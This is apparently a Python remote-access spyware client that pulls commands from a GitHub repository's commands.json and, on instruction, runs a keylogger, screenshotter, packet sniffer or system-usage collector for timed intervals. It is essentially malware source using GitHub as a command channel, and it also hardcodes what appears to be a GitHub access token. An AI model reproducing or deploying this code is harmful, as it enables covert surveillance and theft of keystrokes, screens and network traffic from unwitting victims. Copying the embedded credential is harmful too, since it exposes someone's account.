from github import Github
access_token = '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'
g = Github(access_token)
user = g.get_user()
repo = user.get_repo('python_development')


from keylogger import Keylogger
from sysinfo import SysInfo
from screenshot import Screenshot
from sniffer import Sniffer
import psutil
import time
import json

def command_listener():
    contents = repo.get_contents("commands.json")
    return contents.decoded_content

def mod_keylogger():
    k = Keylogger()
    k.keylogger()

def mod_sysinfo():
    s = SysInfo()
    s.get_usage(psutil.cpu_percent(), psutil.virtual_memory().percent,30)
    time.sleep(0.5)

def mod_screenshotter():
    s = Screenshot()
    s.auto_screen()

def mod_sniffer():
    s = Sniffer()
    s.start_sniffing()

def start_program():
    time_period = 30
    json_commands = command_listener()
    decoded_commands = json.loads(json_commands)
    for command in decoded_commands["commands"]:
        type = command["command"]
        match type:
            case 'keylogger':
                start_time = time.time()
                print("Started keylogging")
                while time.time() - start_time < time_period:
                    mod_keylogger()
                print("Ended keylogging")
            case 'screenshot':            
                start_time = time.time()
                print("Started screenshotting")
                while time.time() - start_time < time_period:
                    mod_screenshotter()
            case 'sysinfo':
                start_time = time.time()
                while time.time() - start_time < time_period:
                    mod_sysinfo()
            case 'sniffer':
                start_time = time.time()
                while time.time() - start_time < time_period:
                    mod_sniffer()

start_program()
 
